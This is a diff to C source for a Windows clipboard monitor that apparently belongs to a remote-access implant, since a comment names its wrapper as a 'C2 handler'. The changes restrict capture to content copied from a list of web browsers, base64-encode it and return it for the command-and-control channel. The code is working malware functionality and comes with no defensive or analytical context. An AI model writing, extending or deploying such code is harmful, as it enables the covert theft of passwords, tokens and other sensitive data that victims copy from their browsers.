@@ -5,6 +5,23 @@
 
 #pragma comment(lib, "psapi.lib")
 
+// Declare base64_encode function
+extern char* base64_encode(const unsigned char* data, size_t data_len);
+
+// List of browser process names to monitor
+static const char* BROWSER_PROCESSES[] = {
+    "chrome.exe",
+    "firefox.exe",
+    "msedge.exe",
+    "opera.exe",
+    "brave.exe",
+    "iexplore.exe",
+    "safari.exe",
+    "vivaldi.exe",
+    "chromium.exe",
+    NULL  // Null terminator
+};
+
 // Logs the clipboard data to the specified file
 void logClipboardData(const wchar_t *data, const char *logFilePath) {
     // Open the log file in append mode
@@ -46,8 +63,8 @@ void printClipboardData(const char *logFilePath) {
     }
 }
 
-// Checks if the clipboard owner belongs to the target process
-int isTargetProcess(HWND hwndOwner, const char *targetExe) {
+// Checks if the clipboard owner belongs to any browser process
+int isBrowserProcess(HWND hwndOwner) {
     DWORD processID = 0;
     // Get the process ID of the clipboard owner
     GetWindowThreadProcessId(hwndOwner, &processID);
@@ -59,27 +76,35 @@ int isTargetProcess(HWND hwndOwner, const char *targetExe) {
 
     char processPath[MAX_PATH] = {0};
     int result = 0;
+    
     // Get the executable path of the process
     if (GetModuleFileNameEx(hProcess, NULL, processPath, MAX_PATH)) {
-        size_t lenPath = strlen(processPath);
-        size_t lenTarget = strlen(targetExe);
-        // Compare the executable name with the target process name
-        if (lenPath >= lenTarget && _stricmp(processPath + (lenPath - lenTarget), targetExe) == 0) {
-            result = 1;
+        // Extract just the filename from the full path
+        char *filename = strrchr(processPath, '\\');
+        if (!filename) filename = processPath;
+        else filename++; // Skip the backslash
+        
+        // Check if the process matches any browser in our list
+        for (int i = 0; BROWSER_PROCESSES[i] != NULL; i++) {
+            if (_stricmp(filename, BROWSER_PROCESSES[i]) == 0) {
+                result = 1;
+                break;
+            }
         }
     }
+    
     CloseHandle(hProcess);
     return result;
 }
 
-// Monitors the clipboard for data set by the target process
+// Monitors the clipboard for data set by browser processes
 void monitorClipboard(const char *targetExe, const char *logFilePath) {
     while (1) {
         // Get the current clipboard owner window handle
         HWND hwndOwner = GetClipboardOwner();
 
-        // Check if the clipboard owner belongs to the target process
-        if (isTargetProcess(hwndOwner, targetExe)) {
+        // Check if the clipboard owner belongs to a browser process
+        if (isBrowserProcess(hwndOwner)) {
             // Print and optionally log the clipboard data
             printClipboardData(logFilePath);
             break;  // Exit loop after printing data
@@ -91,8 +116,14 @@ void monitorClipboard(const char *targetExe, const char *logFilePath) {
 }
 
 // Start clipboard monitor - wrapper function for C2 handler
-// Returns clipboard content (no console output)
+// Returns base64 encoded clipboard content from browser processes only
 char* start_clipboard_monitor() {
+    // Check if clipboard owner is a browser process
+    HWND hwndOwner = GetClipboardOwner();
+    if (!isBrowserProcess(hwndOwner)) {
+        return NULL;  // Not a browser process, return NULL
+    }
+    
     if (!OpenClipboard(NULL)) {
         return NULL;
     }
@@ -118,17 +149,17 @@ char* start_clipboard_monitor() {
     }
     
     // Allocate buffer for UTF-8 string
-    char *result = (char*)malloc(required_size);
-    if (!result) {
+    char *utf8_text = (char*)malloc(required_size);
+    if (!utf8_text) {
         GlobalUnlock(hData);
         CloseClipboard();
         return NULL;
     }
     
     // Convert wide string to UTF-8
-    int len = WideCharToMultiByte(CP_UTF8, 0, pszText, -1, result, required_size, NULL, NULL);
+    int len = WideCharToMultiByte(CP_UTF8, 0, pszText, -1, utf8_text, required_size, NULL, NULL);
     if (len <= 0) {
-        free(result);
+        free(utf8_text);
         GlobalUnlock(hData);
         CloseClipboard();
         return NULL;
@@ -136,5 +167,10 @@ char* start_clipboard_monitor() {
     
     GlobalUnlock(hData);
     CloseClipboard();
-    return result;
+    
+    // Base64 encode the clipboard data
+    char* encoded_result = base64_encode((unsigned char*)utf8_text, strlen(utf8_text));
+    free(utf8_text);  // Free the UTF-8 buffer
+    
+    return encoded_result;  // Return base64 encoded data
 }
